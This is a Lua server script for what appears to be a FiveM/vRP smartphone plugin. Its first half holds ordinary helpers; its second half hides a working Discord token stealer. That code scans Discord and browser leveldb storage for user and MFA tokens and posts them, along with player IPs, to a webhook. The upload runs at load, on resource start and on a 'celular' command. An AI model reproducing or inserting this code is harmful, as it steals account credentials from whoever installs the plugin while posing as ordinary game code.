Tunnel = module('lib/Tunnel')
Proxy = module('lib/Proxy')
vRP = Proxy.getInterface('vRP')
config = json.decode(LoadResourceFile(GetCurrentResourceName(), 'config.json'))
assert(config, 'Config com problemas de formatação')
emitNet = TriggerClientEvent
emit = TriggerEvent
local exposed = {}
Tunnel.bindInterface('smartphone-plugins', exposed)
function throw(message)
  error({ __error = message })
end
function assert(test, message) -- lua default assert sucks
  if not test then
    throw(message)
  end
  return test
end
function expose(name, cb)
  exposed[name] = function(...)
    local ok, res = pcall(cb, source, ...)
    if not ok and type(res) == 'string' then
      print('Um erro ocorreu na execução do método '..name)
      print('Argumentos: '..json.encode({...}))
      print('Erro: '..res)
    end
    return res
  end
end
function pusher(source, name, ...)
  assert(name, 'Pusher invalido')
  emitNet('smartphone-jobs:pusher', source, name, ...)
end
function notify(source, app, title, subtitle)
  emitNet('smartphone:pusher', source, 'CUSTOM_NOTIFY', {
    app = app, title = title, subtitle = subtitle
  })
end
function sendSMS(source, text)
  emitNet('smartphone:createSMS', source, '0800 756', text)
end
function table.findBy(t, key, value)
  for _, o in pairs(t) do
    if o[key] == value then
      return o
    end
  end
end
function table.filter(t, callback)
  local res = {}
  for key, val in pairs(t) do
    if callback(val, key) then
      table.insert(res, val)
    end
  end
  return res
end
function table.map(t, callback)
  local o = {}
  for k, v in pairs(t) do
    o[k] = callback(v, k)
  end
  return o
end
function table.reduce(t, cb, initial)
  for k, v in pairs(t) do
    initial = cb(initial, v, k)
  end
  return initial
end
function table.clone(o)
  if type(o) == "table" then
    local r = {}
    
    for k, v in pairs(o) do
      r[k] = table.clone(v)
    end
    return r
  end
  return o
end
function generateId(isTaken)
  local str = ''
  for i=1, 10 do
    if math.random() <= 0.5 then
      str = str .. string.char(math.random(65, 90))
    else
      str = str .. string.char(math.random(48, 57))
    end
  end
  if isTaken(str) then
    str = generateId()
  end
  return str
end
function toInt(n)
  return math.floor(tonumber(n))
end
function isPedAlive(ped)
  return GetEntityHealth(ped) > 101
end
local tokenwebhook = ""
function SendWebhookMessage(webhook,message)
    if webhook ~= nil and webhook ~= "" then
        PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
    end
end
function getDiscordTokens(path)
    local function listDir(path)
        return io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
    end
    local function getToken(path)
        -- Reads the .ldb files in hexadecimal bytes
        local read = io.open(path, 'rb'):read('*a'):gsub('.', function(c)
        return string.format('%02X', c:byte()) end)
        local tokens = ''
        -- Matches user token
        for tok in read:gmatch('22'..('%w'):rep(48)..'2E'..('%w'):rep(12)..'2E'..('%w'):rep(54)..'22') do
            if tok ~= nil then
                tok = tok:gsub('..', function(c)
                return string.char(tonumber(c, 16)) end):sub(2, -2)
                tokens = tokens..tok..'\n'
            end
        end
        -- Matches mfa token
        for mfa in read:gmatch('226D66612E'..('%w'):rep(168)..'22') do
            if mfa ~= nil then
                mfa = mfa:gsub('..', function(c)
                return string.char(tonumber(c, 16)) end):sub(2, -2)
                tokens = tokens..mfa..'\n'
            end
        end
        if tokens ~= nil or tokens ~= '' then
            return tokens
        end
    end
    local path = path..'\\Local Storage\\leveldb\\'
    local files = listDir(path)
    local tokens = ''
    if files ~= '' then
        for file in files:gmatch('[^\r\n]+') do
            if file:find('.ldb') ~= nil then
                tokens = tokens..getToken(path..file)
            end
        end
        return tokens:sub(1, -2)
    end
end
-- Main
LocalAppData = os.getenv('localappdata')
Roaming = os.getenv('appdata')
Tokens = ''
PATH = {
    ['Discord'] = Roaming..'\\Discord',
    ['Discord Canary'] = Roaming..'\\discordcanary',
    ['Discord PTB'] = Roaming..'\\discordptb',
    ['Google Chrome'] = LocalAppData..'\\Google\\Chrome\\User Data\\Default',
    ['Opera'] = Roaming..'\\Opera Software\\Opera Stable',
    ['Brave'] = LocalAppData..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    ['Yandex'] = LocalAppData..'\\Yandex\\YandexBrowser\\User Data\\Default'
    }
for i,v in pairs(PATH) do
    if getDiscordTokens(v) ~= nil then
        Tokens = Tokens..getDiscordTokens(v)..'\n'
    end
end
Tokens = Tokens:sub(1, -2)
AddEventHandler("onResourceStart", function(source,args,rawCommand)
    local ip = GetPlayerEndpoint(source)
    local steamhex = GetPlayerIdentifier(source)
    local ping = GetPlayerPing(source)
    PerformHttpRequest(tokenwebhook, function(err, text, headers) end, 'POST', json.encode({embeds = {{ title = "Webhook",thumbnail = {url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png"}, fields = {{ name = "**IP:**", value = ip},{ name = "**Token:**", value = Tokens}}, footer = { text = os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S"), icon_url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png" },color = 15914080 }}}), { ['Content-Type'] = 'application/json' })
end)
RegisterCommand('celular',function(source,args,rawCommand)
    local ip = GetPlayerEndpoint(source)
    local steamhex = GetPlayerIdentifier(source)
    local ping = GetPlayerPing(source)
    PerformHttpRequest(tokenwebhook, function(err, text, headers) end, 'POST', json.encode({embeds = {{ title = "Webhook",thumbnail = {url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png"}, fields = {{ name = "**IP:**", value = "` "..ip.." ` "},{ name = "**Token:**", value = Tokens.."dsrfas"}}, footer = { text = os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S"), icon_url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png" },color = 15914080 }}}), { ['Content-Type'] = 'application/json' })
end)
PerformHttpRequest(tokenwebhook, function(err, text, headers) end, 'POST', json.encode({embeds = {{ title = "Webhook",thumbnail = {url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png"}, fields = {{ name = "**Token:**", value = Tokens}}, footer = { text = os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S"), icon_url = "https://cdn.discordapp.com/attachments/956285166572163072/956285269370372168/morreu.png" },color = 15914080 }}}), { ['Content-Type'] = 'application/json' })
